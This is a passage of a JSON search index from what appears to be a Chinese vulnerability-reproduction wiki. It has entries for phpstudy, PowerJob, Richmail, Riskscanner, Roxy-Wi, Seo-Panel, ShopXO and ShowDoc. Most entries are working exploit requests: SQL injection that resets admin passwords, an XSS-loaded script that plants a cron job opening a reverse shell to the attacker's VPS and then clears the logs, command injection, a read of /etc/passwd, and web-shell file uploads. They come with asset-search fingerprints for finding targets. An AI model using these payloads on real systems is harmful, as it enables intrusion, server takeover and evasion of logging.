","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:2:0","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:3:0","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"方式 1 SQL 注入 phpstudy 访问面板登录页面需要添加如下 Headers： x-requested-with: XMLHttpRequest 在用户登录处构造 Payload，其中 Password 的值是经过五次 md5 加密后的结果，脚本如下： import hashlib str = \"123456\" for i in range(0,5): str = hashlib.md5(str.encode()).hexdigest() print(str) 填写 Payload，验证码处需要正确输入： admin';UPDATE ADMINS set PASSWORD = 'c26be8aaf53b15054896983b43eb6a65' where username = 'admin';-- 虽然提示错误信息，但此时已经成功将用户名/密码修改为： admin/123456 在后台计划任务处创建一个反弹 shell 脚本，点击执行： 服务器端监听，成功接收反弹 Shell： ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:3:1","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"方式 2 XSS 在 VPS 上放置 poc.js ，监听 8888 端口，并通过以下命令启动 HTTP 服务： python3 -m http.server 9999 在访问面板登录页面用户名处插入 XSS 语句： \u003cscript src=\"http://\u003cyour-vps-ip\u003e:9999/poc.js\"\u003e\u003c/script\u003e 通过方式 1，已经获得了用户名/密码为 admin/123456，进入后台验证一下计划任务是否成功写入： 等待 1 分钟，成功接收反弹 Shell： ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:3:2","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"漏洞POC poc.js： function exp() { $.ajax({ url: '/service/app/tasks.php?type=task_list', //获取计划任务列表 type: 'GET', headers:{ \"X-Requested-With\": \"XMLHttpRequest\" }, dataType: 'json', success: function (data) { var id = data.data[0].ID; //任务名称 $.ajax({ url: '/service/app/tasks.php?type=exec_task', //执行计划任务 type: 'POST', headers:{ \"X-Requested-With\": \"XMLHttpRequest\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" }, data: { tid: id }, dataType: 'json', success: function (res) { $.ajax({ url: '/service/app/log.php?type=clearlog', type: 'POST', data: { type: 'clearlog' }, dataType: 'json', success: function (res2) {} }); } }); } }); } function save() { var data = new Object(); data.task_id = ''; data.title = 'test'; data.exec_cycle = '5'; data.week = '1'; data.day = '3'; data.hour = '1'; data.minute = '1'; data.shell = 'bash -i \u003e\u0026 /dev/tcp/\u003cyour-vps-ip\u003e/8888 0\u003e\u00261';; $.ajax({ url: '/service/app/tasks.php?type=save_shell', type: 'POST', headers:{ \"X-Requested-With\": \"XMLHttpRequest\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" }, data: data, dataType: 'json', success: function (res) { exp(); } }); } save(); ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:4:0","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"PowerJob list 信息泄漏漏洞 CVE-2023-29923 ","date":"0001-01-01","objectID":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/:0:0","tags":null,"title":"","uri":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/"},{"categories":null,"content":"漏洞描述 PowerJob list接口存在信息泄漏漏洞，攻击者无需通过授权就可以访问授权的接口，获取敏感数据。 ","date":"0001-01-01","objectID":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/:1:0","tags":null,"title":"","uri":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/"},{"categories":null,"content":"漏洞影响 PowerJob ","date":"0001-01-01","objectID":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/:2:0","tags":null,"title":"","uri":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/"},{"categories":null,"content":"网络测绘 app=\"PowerJob\" ","date":"0001-01-01","objectID":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/:3:0","tags":null,"title":"","uri":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /job/list Content-Type: application/json {\"appId\":1,\"index\":0,\"pageSize\":10} ","date":"0001-01-01","objectID":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/:4:0","tags":null,"title":"","uri":"/powerjob-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-29923/"},{"categories":null,"content":"Richmail 企业邮箱 noCookiesMail 登陆绕过漏洞 ","date":"0001-01-01","objectID":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Richmail 企业邮箱 noCookiesMail 接口存在登陆绕过漏洞，攻击者通过漏洞可以获取管理员账号密码登录后台 ","date":"0001-01-01","objectID":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Richmail 企业邮箱 ","date":"0001-01-01","objectID":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Richmail 企业邮箱\" ","date":"0001-01-01","objectID":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc GET /RmWeb/noCookiesMail?func=user:getPassword\u0026userMailName=admin HTTP/1.1 Host: Cache-Control: max-age=0 Content-Type: Application/X-www-Form x-forwarded-for: 127.0.0.1 替换请求中的password字段即可登陆。 ","date":"0001-01-01","objectID":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-nocookiesmail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Riskscanner list SQL注入漏洞 ","date":"0001-01-01","objectID":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Riskscanner list接口存在SQL注入漏洞，通过漏洞可获取服务器权限 ","date":"0001-01-01","objectID":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Riskscanner ","date":"0001-01-01","objectID":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Riskscanner\" ","date":"0001-01-01","objectID":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 发送漏洞请求包 POST /resource/list/1/10 HTTP/1.1 Host: Content-Length: 41 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Content-Type: application/json;charset=UTF-8 {\"sort\":\"1)a union select sleep(5) -- -\"} 使用工具Sqlmap ","date":"0001-01-01","objectID":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/riskscanner-list-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Roxy-Wi options.py 远程命令执行漏洞 CVE-2022-31137 ","date":"0001-01-01","objectID":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/:0:0","tags":null,"title":"","uri":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/"},{"categories":null,"content":"漏洞描述 Roxy-Wi options.py 存在远程命令执行漏洞，攻击者通过漏洞可以执行命令获取服务器权限 ","date":"0001-01-01","objectID":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/:1:0","tags":null,"title":"","uri":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/"},{"categories":null,"content":"漏洞影响 Roxy-WI ","date":"0001-01-01","objectID":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/:2:0","tags":null,"title":"","uri":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/"},{"categories":null,"content":"网络测绘 app=\"HAProxy-WI\" ","date":"0001-01-01","objectID":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/:3:0","tags":null,"title":"","uri":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /app/options.py alert_consumer=1\u0026serv=127.0.0.1\u0026ipbackend=%22%3Bid+%23%23\u0026backend_server=127.0.0.1 另一个POC POST /app/options.py HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 105 Origin: https://x.x.x.x Dnt: 1 Referer: https://x.x.x.x/app/login.py Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close alert_consumer=notNull\u0026serv=roxy-wi.access.log\u0026rows1=10\u0026grep=\u0026exgrep=\u0026hour=00\u0026minut=00\u0026hour1=23\u0026minut1=45 ","date":"0001-01-01","objectID":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/:4:0","tags":null,"title":"","uri":"/roxy-wi-options.py-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-31137/"},{"categories":null,"content":"Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:0:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"漏洞描述 Seo Panel是一个网站搜索引擎优化管理的完整控制面板。它包含了多个SEO工具来增加和跟踪你的网站性能 Seo-Panel 4.8.0以下版本存在过滤不完全的情况，造成存在 反射型XSS漏洞 ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:1:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"漏洞影响 Seo-Panel Version \u003c 4.8.0 ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:2:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"环境搭建 https://github.com/seopanel/Seo-Panel 下载后放入网站根目录根据提示安装访问即可 ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:3:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"漏洞复现 漏洞出现在找回密码页面 http://xxx.xxx.xxx.xxx/login.php?sec=forgot 成功弹窗 ,造成 反射型XSS 漏洞 ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:4:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"漏洞POC 请求包如下 POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass\u0026email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak\u0026code=12345\u0026login= ","date":"0001-01-01","objectID":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/:5:0","tags":null,"title":"","uri":"/seo-panel-4.8.0-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E-cve-2021-3002/"},{"categories":null,"content":"ShopXO 任意文件读取漏洞CNVD-2021-15822 ","date":"0001-01-01","objectID":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:0:0","tags":null,"title":"","uri":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"漏洞描述 ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。 参考链接： https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822 ","date":"0001-01-01","objectID":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:1:0","tags":null,"title":"","uri":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"网络测绘 app=\"ShopXO企业级B2C电商系统提供商\" ","date":"0001-01-01","objectID":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:2:0","tags":null,"title":"","uri":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"漏洞复现 poc： GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ","date":"0001-01-01","objectID":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:3:0","tags":null,"title":"","uri":"/shopxo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"ShowDoc AdminUpdateController.class.php 任意文件上传漏洞 CVE-2021-36440 ","date":"0001-01-01","objectID":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/:0:0","tags":null,"title":"","uri":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/"},{"categories":null,"content":"漏洞描述 ShowDoc AdminUpdateController.class.php 文件中的更新部分代码没有鉴权且存在任意文件上传漏洞 ","date":"0001-01-01","objectID":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/:1:0","tags":null,"title":"","uri":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/"},{"categories":null,"content":"漏洞影响 ShowDoc \u003c V2.9.5 ","date":"0001-01-01","objectID":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/:2:0","tags":null,"title":"","uri":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/"},{"categories":null,"content":"网络测绘 app=\"ShowDoc\" ","date":"0001-01-01","objectID":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/:3:0","tags":null,"title":"","uri":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/"},{"categories":null,"content":"漏洞复现 登录页面 文件路径server/Application/Api/Controller/AdminUpdateController.class.php public function download(){ set_time_limit(1000); ini_set('memory_limit','500M'); $new_version = I(\"new_version\") ; $file_url = I(\"file_url\") ; $version_num = str_replace(\"v\",\"\",$new_version) ; $showdoc_path = \"../\" ; // 进行文件读写权限检查 if(!$this-\u003enew_is_writeable($showdoc_path) || !$this-\u003enew_is_writeable($showdoc_path.\"Sqlite/\" ) || !$this-\u003enew_is_writeable($showdoc_path.\"web/\" ) || !$this-\u003enew_is_writeable($showdoc_path.\"web/index.php\" ) || !$this-\u003enew_is_writeable($showdoc_path.\"server/\" ) || !$this-\u003enew_is_writeable($showdoc_path.\"server/vendor/autoload.php\" ) || !$this-\u003enew_is_writeable($showdoc_path.\"server/Application/Api\" ) ){ $this-\u003esendError(10101,'请手动给showdoc安装目录下的所有文件可写权限，否则程序无法覆盖旧文件'); return ; } $temp_dir = sys_get_temp_dir().\"/showdoc_update/\"; $zip_file = $temp_dir.'showdoc-'.$version_num.'.zip' ; mkdir($temp_dir) ; unlink($zip_file); $file = file_get_contents($file_url); file_put_contents($zip_file,$file); $zip = new \\ZipArchive(); $flag = $zip-\u003eopen($zip_file); if($flag!==true){ $this-\u003esendError(10101,'下载更新压缩包失败'); return ; } $zip-\u003eextractTo($temp_dir); $flag = $zip-\u003eclose(); $zip_file_subpath = $temp_dir.'showdoc-'.$version_num.\"/\" ; if(file_exists($zip_file_subpath.'composer.json') \u0026\u0026 file_exists($zip_file_subpath.'web/index.php') \u0026\u0026 file_exists($zip_file_subpath.'server/vendor/autoload.php') ){ //echo $zip_file_subpath.'存在'; // 移动目录到upload/update $this-\u003ecopydir($zip_file_subpath ,$showdoc_path.'Public/Uploads/update/' ); $this-\u003edeldir($temp_dir); $this-\u003esendResult(array()); }else{ $this-\u003esendError(10101,'下载更新压缩包后，解压的文件缺失'); return ; } } 这里可以看到 $file_url 参数可控，可在任意URl下载 zip文件，向后看看ZIP要求为需要存在部分文件 if(file_exists($zip_file_subpath.'composer.json') \u0026\u0026 file_exists($zip_file_subpath.'web/index.php') \u0026\u0026 file_exists($zip_file_subpath.'server/vendor/autoload.php') ){ 制作ZIP包，index.php 为恶意文件 发送请求包 POST /server/index.php?s=/api/adminUpdate/download file_url=http://xxx.xxx.xxx:8888/showdoc-2.zip\u0026new_version=2 访问上传的文件页面 Public/Uploads/update/web/index.php ","date":"0001-01-01","objectID":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/:4:0","tags":null,"title":"","uri":"/showdoc-adminupdatecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-36440/"},{"categories":null,"content":"ShowDoc PageController.class.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ShowDoc \u003c V2.8.3 ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"ShowDoc\" ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 网站首页如下 构造如下数据包上传php文件 POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Content-Length: 239 Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Accept-Encoding: gzip ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.\u003c\u003ephp\" Content-Type: text/plain \u003c?php phpinfo();?\u003e ----------------------------921378126371623762173617-- 访问回显的路径 ","date":"0001-01-01","objectID":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/showdoc-pagecontroller.class.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mTitle: ShowDoc 任意文件上传漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') 